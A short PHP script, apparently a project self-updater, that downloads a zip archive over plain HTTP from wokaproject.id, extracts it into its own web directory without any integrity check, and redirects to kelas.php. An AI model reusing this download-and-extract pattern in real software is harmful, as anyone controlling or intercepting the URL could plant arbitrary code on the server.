<?php
set_time_limit(0); //Unlimited max execution time
$path = 'file.zip';
$url = 'http://wokaproject.id/kelas.zip';
$newfname = $path;
$file = fopen ($url, "rb");
if($file) {
	$newf = fopen ($newfname, "wb");
	if($newf)
		while(!feof($file)) {
			fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
			;
		}
}
if($file) {
	fclose($file);
}
if($newf) {
	fclose($newf);
}
;
$file = 'file.zip';
 
$path = pathinfo( realpath( $file ), PATHINFO_DIRNAME );
 
$zip = new ZipArchive;
$res = $zip->open($file);
if ($res === TRUE) {
    $zip->extractTo( $path );
    $zip->close();
header("location:kelas.php");

}
else {
    echo "Gagal Update File";
}


?>


